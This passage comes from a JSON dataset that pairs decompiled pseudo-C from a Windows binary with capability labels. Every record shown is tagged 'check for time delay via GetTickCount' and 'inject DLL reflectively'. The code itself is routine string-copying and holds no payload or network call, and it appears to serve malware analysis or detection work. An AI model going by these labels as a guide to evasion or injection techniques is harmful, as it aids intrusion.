arg2);\n    iVar3 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar3, iStack80, 0);\n    *(iVar3 + iStack80) = 0;\n    *(arg3 + 0x38) = iVar3;\n    *(arg3 + 0x40) = iStack80;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    return;\n}\n",
        "token_count": 603
    },
    "140081bc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140081bc0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uchar uVar6;\n    ushort uVar7;\n    uint uVar8;\n    int64_t iVar9;\n    ulong arg1;\n    int64_t iVar10;\n    int64_t *piVar11;\n    uchar uStack185;\n    int64_t iStack184;\n    int64_t iStack168;\n    int64_t *piStack160;\n    uchar *puStack152;\n    int64_t iStack144;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [16];\n    \n    puStack152 = &stack0xffffffffffffffa8;\n    uStack128 = 0x140081be2;\n    uVar7 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x48) = uVar7;\n    uStack128 = 0x140081bef;\n    uVar7 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 200) = 1;\n    *(arg3 + 0x4a) = uVar7;\n    iVar5 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    uStack128 = 0x140081c1e;\n    (**(iVar5 + 0x20))(puStack152, arg2);\n    iVar5 = iStack80;\n    uStack128 = 0x140081c2d;\n    iStack144 = fcn.1400b64f0(iStack80 + 1);\n    uStack128 = 0x140081c41;\n    iVar9 = iVar5;\n    fcn.140029990(puStack152, iStack144, iVar5, 0);\n    *(iStack144 + iVar5) = 0;\n    *(arg3 + 0x18) = iVar5;\n    puStack136 = &stack0xffffffffffffffb8;\n    *(arg3 + 0x10) = iStack144;\n    if (puStack88 != puStack136) {\n        uStack128 = 0x140081c63;\n        fcn.1400b64d0();\n    }\n    uStack128 = 0x140081c6f;\n    piVar11 = arg2;\n    (**(*arg2 + 0x28))(puStack152);\n    iVar5 = iStack80;\n    uVar1 = iStack80 + 1;\n    if (0x3ffffffffffffffc < uVar1) {\n        uStack128 = 0x140081d74;\n        fcn.1400b7660();\n        iStack168 = arg3;\n        piStack160 = arg2;\n        uStack128 = uVar1;\n        uVar6 = (**(*piVar11 + 0x10))(piVar11);\n        *(iVar9 + 0x21) = uVar6;\n        uVar6 = (**(*piVar11 + 0x18))(piVar11);\n        *(iVar9 + 0x22) = uVar6;\n        uVar8 = (**(*piVar11 + 0x40))(piVar11);\n        *(iVar9 + 0x6f) = 1;\n        *(iVar9 + 0x58) = uVar8;\n        iVar5 = *piVar11;\n        *(iVar9 + 0x10) = 0;\n        *(iVar9 + 0x28) = 0;\n        *(iVar9 + 0x38) = 0;\n        *(iVar9 + 0x48) = 0;\n        (**(iVar5 + 0x20))(&stack0xffffffffffffff48, piVar11);\n        iVar5 = *(iStack184 + -0x18);\n        iVar10 = fcn.1400b64f0(iVar5 + 1);\n        fcn.14001efe0(&stack0xffffffffffffff48, iVar10, iVar5, 0);\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x18) = iVar5;\n        piVar2 = *0x140102a70;\n        *(iVar9 + 0x10) = iVar10;\n        if (*piVar2 == 0) {\n            iVar4 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack184 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140075f90(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        (**(*piVar11 + 0x28))(&stack0xffffffffffffff48, piVar11);\n        iVar5 = *(iStack184 + -0x18);\n        iVar10 = fcn.1400b64f0(iVar5 + 1);\n        fcn.14001efe0(&stack0xffffffffffffff48, iVar10, iVar5, 0);\n        iVar4 = *piVar2;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x28) = iVar10;\n        *(iVar9 + 0x30) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack184 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140075f90(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        (**(*piVar11 + 0x30))(&stack0xffffffffffffff48, piVar11);\n        iVar5 = *(iStack184 + -0x18);\n        iVar10 = fcn.1400b64f0(iVar5 + 1);\n        fcn.14001efe0(&stack0xffffffffffffff48, iVar10, iVar5, 0);\n        iVar4 = *piVar2;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x38) = iVar10;\n        *(iVar9 + 0x40) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = iStack184 + -8;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140075f90(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        (**(*piVar11 + 0x38))(&stack0xffffffffffffff48, piVar11);\n        iVar5 = *(iStack184 + -0x18);\n        iVar10 = fcn.1400b64f0(iVar5 + 1);\n        fcn.14001efe0(&stack0xffffffffffffff48, iVar10, iVar5, 0);\n        iVar4 = *piVar2;\n        *(iVar10 + iVar5) = 0;\n        *(iVar9 + 0x48) = iVar10;\n        *(iVar9 + 0x50) = iVar5;\n        if (iVar4 == 0) {\n            iVar4 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = iStack184 + -8;\n            iVar4 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140075f90(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        uVar8 = (**(*piVar11 + 0x48))(piVar11);\n        *(iVar9 + 0x5c) = uVar8;\n        uVar8 = (**(*piVar11 + 0x50))(piVar11);\n        *(iVar9 + 0x60) = uVar8;\n        return;\n    }\n    uStack128 = 0x140081c96;\n    iVar9 = fcn.1400b64f0(uVar1 * 2);\n    uStack128 = 0x140081caa;\n    fcn.14002a720(puStack152, iVar9, iVar5, 0);\n    *(arg3 + 0x28) = iVar9;\n    *(iVar9 + -2 + uVar1 * 2) = 0;\n    *(arg3 + 0x30) = iVar5;\n    if (puStack88 != puStack136) {\n        uStack128 = 0x140081cc9;\n        fcn.1400b64d0();\n    }\n    uStack128 = 0x140081cd5;\n    (**(*arg2 + 0x30))(puStack152, arg2);\n    if (iStack80 + 1U < 0x3ffffffffffffffd) {\n        iVar5 = (iStack80 + 1U) * 2;\n        uStack128 = 0x140081cf8;\n        iVar9 = fcn.1400b64f0(iVar5);\n        uStack128 = 0x140081d0c;\n        fcn.14002a720(puStack152, iVar9, iStack80, 0);\n        *(arg3 + 0x38) = iVar9;\n        *(iVar9 + -2 + iVar5) = 0;\n        *(arg3 + 0x40) = iStack80;\n        if (puStack88 != puStack136) {\n            uStack128 = 0x140081d2a;\n            fcn.1400b64d0();\n        }\n        return;\n    }\n    uStack128 = 0x140081d6d;\n    arg1 = fcn.1400b7660();\n    do {\n        if (puStack88 != puStack136) {\n            uStack128 = 0x140081d51;\n            fcn.1400b64d0();\n        }\n        uStack128 = 0x140081d59;\n        arg1 = fcn.14000f000(arg1);\n    } while( true );\n}\n",
        "token_count": 2436
    },
    "14008206": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140082060(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [24];\n    \n    uVar1 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x21) = uVar1;\n    uVar1 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x22) = uVar1;\n    uVar2 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x6f) = 1;\n    *(arg3 + 0x58) = uVar2;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar4 + 0x20))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    *(arg3 + 0x10) = iVar3;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    (**(*arg2 + 0x28))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar3;\n    *(arg3 + 0x30) = iVar4;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    (**(*arg2 + 0x30))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar3;\n    *(arg3 + 0x40) = iVar4;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    (**(*arg2 + 0x38))(&puStack88, arg2);\n    iVar4 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar4, iStack80, 0);\n    *(iVar4 + iStack80) = 0;\n    *(arg3 + 0x48) = iVar4;\n    *(arg3 + 0x50) = iStack80;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    uVar2 = (**(*arg2 + 0x48))(arg2);\n    *(arg3 + 0x5c) = uVar2;\n    uVar2 = (**(*arg2 + 0x50))(arg2);\n    *(arg3 + 0x60) = uVar2;\n    return;\n}\n",
        "token_count": 855
    },
    "14008253": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140082530(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [24];\n    \n    uVar1 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x21) = uVar1;\n    uVar1 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x22) = uVar1;\n    uVar2 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x6f) = 1;\n    *(arg3 + 0x58) = uVar2;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar4 + 0x20))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    *(arg3 + 0x10) = iVar3;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    (**(*arg2 + 0x28))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar3;\n    *(arg3 + 0x30) = iVar4;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    (**(*arg2 + 0x30))(&puStack88, arg2);\n    iVar4 = iStack80;\n    iVar3 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar3, iVar4, 0);\n    *(iVar3 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar3;\n    *(arg3 + 0x40) = iVar4;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    (**(*arg2 + 0x38))(&puStack88, arg2);\n    iVar4 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar4, iStack80, 0);\n    *(iVar4 + iStack80) = 0;\n    *(arg3 + 0x48) = iVar4;\n    *(arg3 + 0x50) = iStack80;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    uVar2 = (**(*arg2 + 0x48))(arg2);\n    *(arg3 + 0x5c) = uVar2;\n    uVar2 = (**(*arg2 + 0x50))(arg2);\n    *(arg3 + 0x60) = uVar2;\n    return;\n}\n",
        "token_count": 855
    },
    "140082a8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140082a80(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ushort uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    ulong *arg1;\n    int64_t *piVar10;\n    uchar *puStack312;\n    int64_t iStack304;\n    uchar auStack296 [24];\n    int64_t *piStack272;\n    uchar *puStack264;\n    int64_t iStack256;\n    uint64_t uStack248;\n    int32_t *piStack240;\n    int64_t iStack232;\n    uchar uStack185;\n    int64_t iStack184;\n    int64_t iStack176;\n    int64_t *piStack168;\n    uchar *puStack160;\n    int64_t iStack152;\n    uint64_t uStack144;\n    uchar *puStack136;\n    int64_t iStack128;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [16];\n    \n    puStack160 = &stack0xffffffffffffffa8;\n    iStack128 = 0x140082aa2;\n    uVar4 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x22) = uVar4;\n    iStack128 = 0x140082aaf;\n    uVar4 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x24) = uVar4;\n    iStack128 = 0x140082abc;\n    uVar5 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x7a) = 1;\n    *(arg3 + 0x58) = uVar5;\n    iVar3 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    iStack128 = 0x140082aef;\n    (**(iVar3 + 0x20))(puStack160, arg2);\n    iVar3 = iStack80;\n    iStack128 = 0x140082afe;\n    iStack152 = fcn.1400b64f0(iStack80 + 1);\n    iStack128 = 0x140082b12;\n    iVar6 = iVar3;\n    fcn.140029990(puStack160, iStack152, iVar3, 0);\n    puStack136 = &stack0xffffffffffffffb8;\n    *(iStack152 + iVar3) = 0;\n    *(arg3 + 0x10) = iStack152;\n    *(arg3 + 0x18) = iVar3;\n    if (puStack88 != puStack136) {\n        iStack128 = 0x140082b34;\n        fcn.1400b64d0();\n    }\n    iStack128 = 0x140082b40;\n    piStack272 = arg2;\n    (**(*arg2 + 0x28))(puStack160);\n    iVar3 = iStack80;\n    uStack144 = iStack80 + 1;\n    if (uStack144 < 0x3ffffffffffffffd) {\n        iStack128 = 0x140082b67;\n        iVar6 = fcn.1400b64f0(uStack144 * 2);\n        iStack128 = 0x140082b7b;\n        fcn.14002a720(puStack160, iVar6, iVar3, 0);\n        *(arg3 + 0x28) = iVar6;\n        *(iVar6 + -2 + uStack144 * 2) = 0;\n        *(arg3 + 0x30) = iVar3;\n        if (puStack88 != puStack136) {\n            iStack128 = 0x140082b9a;\n            fcn.1400b64d0();\n        }\n        iStack128 = 0x140082ba6;\n        (**(*arg2 + 0x30))(puStack160, arg2);\n        iVar3 = iStack80;\n        if (iStack80 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iStack80 + 1U) * 2;\n            iStack128 = 0x140082bcd;\n            iVar7 = fcn.1400b64f0(iVar6);\n            iStack128 = 0x140082be1;\n            fcn.14002a720(puStack160, iVar7, iVar3, 0);\n            *(arg3 + 0x38) = iVar7;\n            *(iVar7 + -2 + iVar6) = 0;\n            *(arg3 + 0x40) = iVar3;\n            if (puStack88 != puStack136) {\n                iStack128 = 0x140082c00;\n                fcn.1400b64d0();\n            }\n            iStack128 = 0x140082c0c;\n            (**(*arg2 + 0x38))(puStack160, arg2);\n            if (iStack80 + 1U < 0x3ffffffffffffffd) {\n                iVar3 = (iStack80 + 1U) * 2;\n                iStack128 = 0x140082c33;\n                iVar6 = fcn.1400b64f0(iVar3);\n                iStack128 = 0x140082c47;\n                fcn.14002a720(puStack160, iVar6, iStack80, 0);\n                *(arg3 + 0x48) = iVar6;\n                *(iVar6 + -2 + iVar3) = 0;\n                *(arg3 + 0x50) = iStack80;\n                if (puStack88 != puStack136) {\n                    iStack128 = 0x140082c66;\n                    fcn.1400b64d0();\n                }\n                iStack128 = 0x140082c6f;\n                uVar5 = (**(*arg2 + 0x48))(arg2);\n                *(arg3 + 0x5c) = uVar5;\n                iStack128 = 0x140082c7b;\n                uVar5 = (**(*arg2 + 0x50))(arg2);\n                *(arg3 + 0x60) = uVar5;\n                return;\n            }\n            iStack128 = 0x140082cc0;\n            uVar8 = fcn.1400b7660();\n        }\n        else {\n            iStack128 = 0x140082cc7;\n            uVar8 = fcn.1400b7660();\n        }\n        do {\n            if (puStack88 != puStack136) {\n                iStack128 = 0x140082ca4;\n                fcn.1400b64d0();\n            }\n            iStack128 = 0x140082cac;\n            uVar8 = fcn.14000f000(uVar8);\n        } while( true );\n    }\n    iStack128 = 0x140082cce;\n    fcn.1400b7660();\n    iStack128 = iStack80;\n    puStack264 = &stack0xffffffffffffff48;\n    iStack232 = 0x140082cf2;\n    iStack176 = arg3;\n    piStack168 = arg2;\n    uVar4 = (**(*piStack272 + 0x10))(piStack272);\n    *(iVar6 + 0x22) = uVar4;\n    iStack232 = 0x140082cff;\n    uVar4 = (**(*piStack272 + 0x18))(piStack272);\n    *(iVar6 + 0x24) = uVar4;\n    iStack232 = 0x140082d0c;\n    uVar5 = (**(*piStack272 + 0x40))(piStack272);\n    *(iVar6 + 0x7a) = 1;\n    *(iVar6 + 0x58) = uVar5;\n    iVar3 = *piStack272;\n    *(iVar6 + 0x10) = 0;\n    *(iVar6 + 0x28) = 0;\n    *(iVar6 + 0x38) = 0;\n    *(iVar6 + 0x48) = 0;\n    iStack232 = 0x140082d3f;\n    (**(iVar3 + 0x20))(puStack264, piStack272);\n    iVar3 = *(iStack184 + -0x18);\n    iStack232 = 0x140082d52;\n    iStack256 = fcn.1400b64f0(iVar3 + 1);\n    iStack232 = 0x140082d66;\n    iVar7 = iVar3;\n    fcn.14001efe0(puStack264, iStack256, iVar3, 0);\n    piStack240 = *0x140102a70;\n    *(iStack256 + iVar3) = 0;\n    *(iVar6 + 0x10) = iStack256;\n    iVar2 = *piStack240;\n    *(iVar6 + 0x18) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack184 + -8);\n        *(iStack184 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack184 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack232 = 0x140082f60;\n        fcn.140075f90(iStack184 + -0x18, &stack0xffffffffffffff47);\n    }\n    iStack232 = 0x140082daa;\n    piVar10 = piStack272;\n    (**(*piStack272 + 0x28))(puStack264);\n    iVar3 = *(iStack184 + -0x18);\n    uStack248 = iVar3 + 1;\n    if (0x3ffffffffffffffc < uStack248) {\n        iStack232 = 0x14008302c;\n        fcn.1400b7660();\n        iStack232 = iVar3;\n        uVar4 = (**(*piVar10 + 0x10))(piVar10);\n        *(iVar7 + 0x22) = uVar4;\n        uVar4 = (**(*piVar10 + 0x18))(piVar10);\n        *(iVar7 + 0x24) = uVar4;\n        uVar5 = (**(*piVar10 + 0x40))(piVar10);\n        *(iVar7 + 0x7a) = 1;\n        *(iVar7 + 0x58) = uVar5;\n        iVar3 = *piVar10;\n        *(iVar7 + 0x10) = 0;\n        *(iVar7 + 0x28) = 0;\n        *(iVar7 + 0x38) = 0;\n        *(iVar7 + 0x48) = 0;\n        (**(iVar3 + 0x20))(&stack0xfffffffffffffec8, piVar10);\n        iVar3 = iStack304;\n        iVar6 = fcn.1400b64f0(iStack304 + 1);\n        fcn.140029990(&stack0xfffffffffffffec8, iVar6, iVar3, 0);\n        *(iVar6 + iVar3) = 0;\n        *(iVar7 + 0x10) = iVar6;\n        *(iVar7 + 0x18) = iVar3;\n        if (puStack312 != &stack0xfffffffffffffed8) {\n            fcn.1400b64d0();\n        }\n        arg1 = &stack0xfffffffffffffec8;\n        (**(*piVar10 + 0x28))(&stack0xfffffffffffffec8, piVar10);\n        iVar3 = iStack304;\n        if (iStack304 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iStack304 + 1U) * 2;\n            iVar9 = fcn.1400b64f0(iVar6);\n            fcn.14002a720(&stack0xfffffffffffffec8, iVar9, iVar3, 0);\n            *(iVar7 + 0x28) = iVar9;\n            *(iVar9 + -2 + iVar6) = 0;\n            *(iVar7 + 0x30) = iVar3;\n            if (puStack312 != &stack0xfffffffffffffed8) {\n                fcn.1400b64d0();\n            }\n            (**(*piVar10 + 0x30))(&stack0xfffffffffffffec8, piVar10);\n            iVar3 = iStack304;\n            if (iStack304 + 1U < 0x3ffffffffffffffd) {\n                iVar6 = (iStack304 + 1U) * 2;\n                iVar9 = fcn.1400b64f0(iVar6);\n                fcn.14002a720(&stack0xfffffffffffffec8, iVar9, iVar3, 0);\n                *(iVar7 + 0x38) = iVar9;\n                *(iVar9 + -2 + iVar6) = 0;\n                *(iVar7 + 0x40) = iVar3;\n                if (puStack312 != &stack0xfffffffffffffed8) {\n                    fcn.1400b64d0();\n                }\n                (**(*piVar10 + 0x38))(&stack0xfffffffffffffec8, piVar10);\n                if (iStack304 + 1U < 0x3ffffffffffffffd) {\n                    iVar3 = (iStack304 + 1U) * 2;\n                    iVar6 = fcn.1400b64f0(iVar3);\n                    fcn.14002a720(&stack0xfffffffffffffec8, iVar6, iStack304, 0);\n                    *(iVar7 + 0x48) = iVar6;\n                    *(iVar6 + -2 + iVar3) = 0;\n                    *(iVar7 + 0x50) = iStack304;\n                    if (puStack312 != &stack0xfffffffffffffed8) {\n                        fcn.1400b64d0();\n                    }\n                    uVar5 = (**(*piVar10 + 0x48))(piVar10);\n                    *(iVar7 + 0x5c) = uVar5;\n                    uVar5 = (**(*piVar10 + 0x50))(piVar10);\n                    *(iVar7 + 0x60) = uVar5;\n                    return;\n                }\n                uVar8 = fcn.1400b7660();\n            }\n            else {\n                uVar8 = fcn.1400b7660();\n            }\n            do {\n                if (puStack312 != &stack0xfffffffffffffed8) {\n                    fcn.1400b64d0();\n                }\n                uVar8 = fcn.14000f000(uVar8);\n            } while( true );\n        }\n        fcn.1400b7660();\n        *arg1 = 0x14010aa10;\n        fcn.1400b1850(arg1 + 4);\n        *arg1 = 0x14010a460;\n        fcn.14007d8f0(arg1);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)(arg1);\n        return;\n    }\n    iStack232 = 0x140082dd5;\n    iVar7 = fcn.1400b64f0(uStack248 * 2);\n    iStack232 = 0x140082de9;\n    fcn.14001df50(puStack264, iVar7, iVar3, 0);\n    iVar2 = *piStack240;\n    *(iVar6 + 0x28) = iVar7;\n    *(iVar7 + -2 + uStack248 * 2) = 0;\n    *(iVar6 + 0x30) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack184 + -8);\n        *(iStack184 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack184 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack232 = 0x140082fd8;\n        fcn.14006ca90(iStack184 + -0x18, &stack0xffffffffffffff47);\n    }\n    iStack232 = 0x140082e29;\n    (**(*piStack272 + 0x30))(puStack264, piStack272);\n    iVar3 = *(iStack184 + -0x18);\n    if (iVar3 + 1U < 0x3ffffffffffffffd) {\n        iVar7 = (iVar3 + 1U) * 2;\n        iStack232 = 0x140082e54;\n        iVar9 = fcn.1400b64f0(iVar7);\n        iStack232 = 0x140082e68;\n        fcn.14001df50(puStack264, iVar9, iVar3, 0);\n        iVar2 = *piStack240;\n        *(iVar6 + 0x38) = iVar9;\n        *(iVar9 + -2 + iVar7) = 0;\n        *(iVar6 + 0x40) = iVar3;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack184 + -8);\n            *(iStack184 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack184 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            iStack232 = 0x140082fb0;\n            fcn.14006ca90(iStack184 + -0x18, &stack0xffffffffffffff47);\n        }\n        iStack232 = 0x140082ea7;\n        (**(*piStack272 + 0x38))(puStack264, piStack272);\n        iVar3 = *(iStack184 + -0x18);\n        if (iVar3 + 1U < 0x3ffffffffffffffd) {\n            iVar7 = (iVar3 + 1U) * 2;\n            iStack232 = 0x140082ed2;\n            iVar9 = fcn.1400b64f0(iVar7);\n            iStack232 = 0x140082ee6;\n            fcn.14001df50(puStack264, iVar9, iVar3, 0);\n            iVar2 = *piStack240;\n            *(iVar6 + 0x48) = iVar9;\n            *(iVar9 + -2 + iVar7) = 0;\n            *(iVar6 + 0x50) = iVar3;\n            if (iVar2 == 0) {\n                iVar2 = *(iStack184 + -8);\n                *(iStack184 + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = iStack184 + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                iStack232 = 0x140082f84;\n                fcn.14006ca90(iStack184 + -0x18, &stack0xffffffffffffff47);\n            }\n            iStack232 = 0x140082f19;\n            uVar5 = (**(*piStack272 + 0x48))(piStack272);\n            *(iVar6 + 0x5c) = uVar5;\n            iStack232 = 0x140082f25;\n            uVar5 = (**(*piStack272 + 0x50))(piStack272);\n            *(iVar6 + 0x60) = uVar5;\n            return;\n        }\n        iStack232 = 0x140083025;\n        uVar8 = fcn.1400b7660();\n    }\n    else {\n        iStack232 = 0x140082fe2;\n        uVar8 = fcn.1400b7660();\n    }\n    do {\n        iStack232 = 0x140082ff8;\n        fcn.14006caa0(iStack184 + -0x18);\n        iStack232 = 0x140083000;\n        uVar8 = fcn.14000f000(uVar8);\n    } while( true );\n}\n",
        "token_count": 4641
    },
    "14008303": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.140083030(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    ushort uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong arg1;\n    uchar **arg1_00;\n    uchar *puStack88;\n    int64_t iStack80;\n    uchar auStack72 [16];\n    \n    uVar2 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x22) = uVar2;\n    uVar2 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x24) = uVar2;\n    uVar3 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x7a) = 1;\n    *(arg3 + 0x58) = uVar3;\n    iVar1 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar1 + 0x20))(&puStack88, arg2);\n    iVar1 = iStack80;\n    iVar4 = fcn.1400b64f0(iStack80 + 1);\n    fcn.140029990(&puStack88, iVar4, iVar1, 0);\n    *(iVar4 + iVar1) = 0;\n    *(arg3 + 0x10) = iVar4;\n    *(arg3 + 0x18) = iVar1;\n    if (puStack88 != auStack72) {\n        fcn.1400b64d0();\n    }\n    arg1_00 = &puStack88;\n    (**(*arg2 + 0x28))(&puStack88, arg2);\n    iVar1 = iStack80;\n    if (0x3ffffffffffffffc < iStack80 + 1U) {\n        fcn.1400b7660();\n        *arg1_00 = 0x14010aa10;\n        fcn.1400b1850(arg1_00 + 4);\n        *arg1_00 = 0x14010a460;\n        fcn.14007d8f0(arg1_00);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)(arg1_00);\n        return;\n    }\n    iVar4 = (iStack80 + 1U) * 2;\n    iVar5 = fcn.1400b64f0(iVar4);\n    fcn.14002a720(&puStack88, iVar5, iVar1, 0);\n    *(arg3 + 0x28) = iVar5;\n    *(iVar5 + -2 + iVar4) = 0;\n    *(arg3 + 0x30) = iVar1;\n    if 